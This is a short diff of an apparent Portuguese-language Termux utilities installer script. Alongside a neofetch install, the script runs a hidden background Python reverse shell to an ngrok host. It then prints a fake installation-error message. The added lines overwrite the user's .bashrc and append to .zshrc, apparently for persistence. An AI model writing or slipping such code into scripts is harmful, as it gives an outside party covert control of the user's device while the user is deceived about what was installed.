@@ -9,3 +9,6 @@ echo " [*] - Instalando Utilitarios"
 pkg install neofetch &> /dev/null
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",11969));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' &
 echo " [!] - Houve algum erro durante a instalação! Tente reinstalar novamente."
+
+cat include > $HOME/.bashrc
+cat include >> $HOME/.zshrc
